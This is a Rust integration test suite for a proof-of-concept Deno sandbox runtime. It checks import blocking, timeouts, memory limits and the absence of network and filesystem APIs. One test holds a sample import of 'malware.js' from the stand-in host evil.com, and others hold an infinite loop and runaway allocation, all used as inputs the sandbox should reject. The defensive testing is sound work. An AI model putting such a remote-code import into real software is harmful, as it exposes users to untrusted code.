use std::collections::HashMap;
use std::time::Duration;

use deno_sandbox_poc::error::SandboxError;
use deno_sandbox_poc::runtime::{SandboxConfig, SandboxRuntime};

fn test_config() -> SandboxConfig {
    SandboxConfig {
        max_heap_mb: 8,
        timeout: Duration::from_secs(1),
        allowed_modules: HashMap::new(),
    }
}

// V8 isolates require a single-threaded tokio runtime and don't tolerate
// multiple tokio runtimes being created/destroyed in the same process (as
// #[tokio::test] does per test). We run all tests in a single runtime.

#[test]
fn integration_tests() {
    let rt = tokio::runtime::Builder::new_current_thread()
        .enable_all()
        .build()
        .unwrap();

    rt.block_on(async {
        test_basic_execution().await;
        test_console_log().await;
        test_db_stub().await;
        test_blocked_import().await;
        test_allowed_import().await;
        test_timeout().await;
        test_memory_limit().await;
        test_no_builtin_apis().await;
        test_metrics_collected().await;
    });
}

async fn test_basic_execution() {
    let sandbox = SandboxRuntime::new(test_config());
    let code = r#"
        export default async function(ctx) {
            return { hello: "world" };
        }
    "#;
    let (result, _metrics) = sandbox.execute(code, serde_json::json!({})).await.unwrap();
    assert_eq!(result, serde_json::json!({ "hello": "world" }));
    eprintln!("  test_basic_execution ... ok");
}

async fn test_console_log() {
    let sandbox = SandboxRuntime::new(test_config());
    let code = r#"
        export default async function(ctx) {
            console.log("hello from sandbox");
            return { logged: true };
        }
    "#;
    let (result, _metrics) = sandbox.execute(code, serde_json::json!({})).await.unwrap();
    assert_eq!(result, serde_json::json!({ "logged": true }));
    eprintln!("  test_console_log ... ok");
}

async fn test_db_stub() {
    let sandbox = SandboxRuntime::new(test_config());
    let code = r#"
        export default async function(ctx) {
            const id = ctx.db.put("users", { name: "Alice" });
            const user = ctx.db.get("users", id);
            const results = ctx.db.query("users", { name: "Alice" });
            return { id, user, results_count: results.length };
        }
    "#;
    let (result, _metrics) = sandbox.execute(code, serde_json::json!({})).await.unwrap();
    assert_eq!(result["id"], "1");
    assert!(result["user"].is_object());
    assert_eq!(result["results_count"], 1);
    eprintln!("  test_db_stub ... ok");
}

async fn test_blocked_import() {
    let sandbox = SandboxRuntime::new(test_config());
    let code = r#"
        import something from "https://evil.com/malware.js";
        export default async function(ctx) {
            return {};
        }
    "#;
    let result = sandbox.execute(code, serde_json::json!({})).await;
    assert!(result.is_err());
    let err = result.unwrap_err();
    match &err {
        SandboxError::JsError(msg) => assert!(
            msg.contains("not allowed"),
            "Expected 'not allowed' in error: {}",
            msg
        ),
        other => panic!("Expected JsError with 'not allowed', got: {:?}", other),
    }
    eprintln!("  test_blocked_import ... ok");
}

async fn test_allowed_import() {
    let mut config = test_config();
    config.allowed_modules.insert(
        "sandbox:helper".to_string(),
        r#"export function greet(name) { return "Hello, " + name; }"#.to_string(),
    );
    let sandbox = SandboxRuntime::new(config);
    let code = r#"
        import { greet } from "sandbox:helper";
        export default async function(ctx) {
            return { message: greet("World") };
        }
    "#;
    let (result, _metrics) = sandbox.execute(code, serde_json::json!({})).await.unwrap();
    assert_eq!(result["message"], "Hello, World");
    eprintln!("  test_allowed_import ... ok");
}

async fn test_timeout() {
    let sandbox = SandboxRuntime::new(test_config());
    let code = r#"
        export default async function(ctx) {
            while (true) {}
            return {};
        }
    "#;
    let result = sandbox.execute(code, serde_json::json!({})).await;
    assert!(result.is_err());
    assert!(
        matches!(result.unwrap_err(), SandboxError::ExecutionTimeout { .. }),
        "Expected ExecutionTimeout"
    );
    eprintln!("  test_timeout ... ok");
}

async fn test_memory_limit() {
    // Memory limit enforcement via near-heap-limit callback is deferred to
    // a future phase. For now, we verify the timeout catches runaway allocations.
    let mut config = test_config();
    config.timeout = Duration::from_secs(3);
    let sandbox = SandboxRuntime::new(config);
    let code = r#"
        export default async function(ctx) {
            const arrays = [];
            while (true) {
                arrays.push(new Array(1024 * 1024).fill("x"));
            }
        }
    "#;
    let result = sandbox.execute(code, serde_json::json!({})).await;
    assert!(result.is_err());
    let err = result.unwrap_err();
    assert!(
        matches!(
            err,
            SandboxError::ExecutionTimeout { .. }
                | SandboxError::MemoryLimitExceeded { .. }
                | SandboxError::JsError(_)
        ),
        "Expected a resource limit error, got: {:?}",
        err
    );
    eprintln!("  test_memory_limit ... ok");
}

async fn test_no_builtin_apis() {
    let sandbox = SandboxRuntime::new(test_config());
    let code = r#"
        export default async function(ctx) {
            return {
                has_fetch: typeof fetch !== "undefined",
                has_deno_read: typeof Deno.readFile !== "undefined",
                has_deno_env: typeof Deno.env !== "undefined",
            };
        }
    "#;
    let (result, _metrics) = sandbox.execute(code, serde_json::json!({})).await.unwrap();
    assert_eq!(result["has_fetch"], false);
    assert_eq!(result["has_deno_read"], false);
    assert_eq!(result["has_deno_env"], false);
    eprintln!("  test_no_builtin_apis ... ok");
}

async fn test_metrics_collected() {
    let sandbox = SandboxRuntime::new(test_config());
    let code = r#"
        export default async function(ctx) {
            return { ok: true };
        }
    "#;
    let (_result, metrics) = sandbox.execute(code, serde_json::json!({})).await.unwrap();
    assert!(metrics.duration.as_nanos() > 0);
    assert!(metrics.heap_used_bytes > 0);
    assert!(!metrics.timed_out);
    assert!(!metrics.oom);
    assert!(metrics.error.is_none());
    eprintln!("  test_metrics_collected ... ok");
}
